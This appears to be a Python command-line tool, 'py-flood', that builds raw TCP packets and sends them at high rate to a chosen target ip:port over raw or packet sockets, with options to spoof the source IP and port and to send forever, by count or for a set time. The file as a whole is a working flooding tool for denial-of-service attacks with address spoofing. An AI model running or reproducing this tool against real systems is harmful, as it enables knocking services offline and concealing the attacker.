import argparse
import socket
import sys

from pypackets.packets import Packet, Limitation, SendMode
from pypackets.headers.eth_hdr import EthernetHeader, EthernetLayer
from pypackets.headers.ip_hdr import IPHeader, IPLayer
from pypackets.headers.tcp_hdr import TCPHeader, TCPLayer
from pypackets.headers.layers import _create_af_inet_raw_socket, _create_af_packet_socket
from pypackets.send_pkt import _send_af_packet, _send_inet_raw
from pypackets.checksum import Checksum
from pypackets.benchmark.benchmark import bench_test

from pypackets.syscalls.sendmmsg import SendMmsg

class CLI:
  def __init__(self):
    self.cli = argparse.ArgumentParser(
      prog='py-flood',
      description='What the program does',
      epilog='Warning only sudo run'
    )

    self.cli.add_argument("dst", help="ip:port")
    self.cli.add_argument("-s", "--source", type=str, default="",
                          help="set source ip and port if ip not set use your ip, use -s spoof for spoof your ip and sport.\nIf port not set use random.\nExample ip:port")
    self.cli.add_argument("-i", "--interface", type=str,
                          help="interface name if not set using default for dst ip")
    self.cli.add_argument("-f", "--forever", type=bool, help="Send packets forever")
    self.cli.add_argument("-c", "--count", type=int, help="Numbers of packet to send")
    self.cli.add_argument("-t", "--by-time", type=float, help="Time(in secs) to send packets")
    self.cli.add_argument("-b", "--bench", type=int, help="run N benches", default=False)
    self.cli.add_argument("--socket", type=str, default="inet_raw",
                          help="socket type: inet_raw or packet_raw")
    self.BenchMulStep = 2
  
  def _create_tcp_pkt(self, dport: int, sport: int, checksum = None) -> TCPLayer: 
    if not sport: 
      tcp_hdr = TCPHeader(sport=12345, dport=dport)
      tcp = TCPLayer(tcp_hdr, spoof_fields={"sport"}, culc_check=checksum)
    else: 
      tcp_hdr = TCPHeader(sport=sport, dport=dport)
      tcp = TCPLayer(tcp_hdr, culc_check=checksum)
    return tcp
  
  def __call__(self, cli_args):
    sendmmsg = SendMmsg()
    dst_ip, dport = cli_args.dst.split(":"); dport = int(dport)
    saddrs = cli_args.source.split(":")
    src_ip = None; sport = 0
    for saddr in saddrs:
      match saddr:
        case "": continue
        case "spoof": src_ip = "spoof"
        case _ as addr:
          try: sport = int(addr)
          except ValueError: src_ip = addr
    print(f"DEBUG: src_ip: {src_ip}, sport: {sport}", file=sys.stderr)
    if not cli_args.interface: iface = EthernetLayer.get_default_interface(dst_ip)
    else: iface = cli_args.interface
    match src_ip:
      case "spoof": 
        ip_hdr = IPHeader(dst_ip=socket.inet_aton(dst_ip))
        ip = IPLayer(ip_hdr, spoof_fields={"src_ip"})
      case None: 
        ip_hdr = IPHeader(dst_ip=socket.inet_aton(dst_ip), src_ip=socket.inet_aton(IPHeader.get_src_ip(iface)))
        ip = IPLayer(ip_hdr)
        print(f"\033[93;1mWarning: using ip: {IPHeader.get_src_ip(iface)} as your ip\033[0m", file=sys.stderr)
      case _ as _ip: 
        ip_hdr = IPHeader(dst_ip=socket.inet_aton(dst_ip), src_ip=socket.inet_aton(_ip))
        ip = IPLayer(ip_hdr)
    
    
    limits = [cli_args.count, cli_args.by_time, cli_args.forever]
    if limits.count(None) != len(limits)-1 and not cli_args.bench: raise Exception("Invalid arguments must be set only one from -c -f -t")
    limit = Limitation(*limits)
    match cli_args.socket:
      case "inet_raw":
        checksum = Checksum(socket.inet_aton(dst_ip))
        fd: socket.socket = _create_af_inet_raw_socket()
        ip.tot_len = 40
        tcp: TCPLayer = self._create_tcp_pkt(dport, sport, checksum.tcp_checksum_buf)
        init_pkt: Packet = Packet(ip, tcp, fd_type=cli_args.socket, pkts_max=1, pkt_len=40, _sorted=True)
        if cli_args.bench:
          str_table = bench_test(cli_args.bench, self.BenchMulStep, 54, func=init_pkt.send_pkts, 
                                fd=fd, 
                                send_func=_send_inet_raw, 
                                dst_ip=dst_ip, dport=dport
          )
          print(str_table)
          fd.close()
          return -1
        return init_pkt.send_pkts(fd=fd, limit=limit, 
                                  send_func=_send_inet_raw,
                                  send_mode=SendMode.ByOnePacket, dst_ip=dst_ip, 
                                  dport=dport
        )
      case "packet_raw":
        checksum = Checksum(socket.inet_aton(dst_ip))
        src_mac, dst_mac = EthernetHeader.get_src_mac(iface), EthernetHeader.get_dst_mac(iface)
        print(f"\033[93;1mWarning: use interface: {iface}. src_mac: {src_mac}, dst_mac: {dst_mac}\033[0m", file=sys.stderr)
        eth_hdr: EthernetHeader = EthernetHeader(EthernetHeader._mac_to_bytes(dst_mac), EthernetHeader._mac_to_bytes(src_mac))
        eth = EthernetLayer(eth_hdr)
        pkts_max = sendmmsg.get_max_sendmmsg_pkts_count()
        print(f"DEBUG: UIO_MAXIOV = {pkts_max}", file=sys.stderr)
        
        ip.ip_hdr.tot_len = 40 # TODO: compute it
        ip.culc_check = checksum.ip_checksum_buf
        tcp: TCPLayer = self._create_tcp_pkt(dport, sport, checksum.tcp_checksum_buf)
        send_func = _send_af_packet
        send_func_kwargc = {"pkt_size": 54, "iov_max": pkts_max, "fastmmsg": sendmmsg.fast_call}
        init_pkt: Packet = Packet(eth, ip, tcp, fd_type=cli_args.socket, pkts_max=pkts_max, _sorted=True)
        fd: socket.socket = _create_af_packet_socket(iface)
        if cli_args.bench:
          str_table = bench_test(cli_args.bench, self.BenchMulStep, 54, func=init_pkt.send_pkts, 
                                fd=fd, send_func=send_func, **send_func_kwargc
          )
          print(str_table)
          fd.close()
          return -1
        sent_pkts = init_pkt.send_pkts(fd=fd, limit=limit, 
                                      send_func=send_func,
                                      send_mode=SendMode.ByManyPackets, 
                                      **send_func_kwargc
        )
      case _: raise Exception("Socket type not found")
    fd.close()
    return sent_pkts


def main():
  cli = CLI()
  cli_args = cli.cli.parse_args()
  pkts_count = cli(cli_args)
  if pkts_count >= 0: print(f"Packets sent: {pkts_count}", file=sys.stderr)

if __name__ == "__main__": main()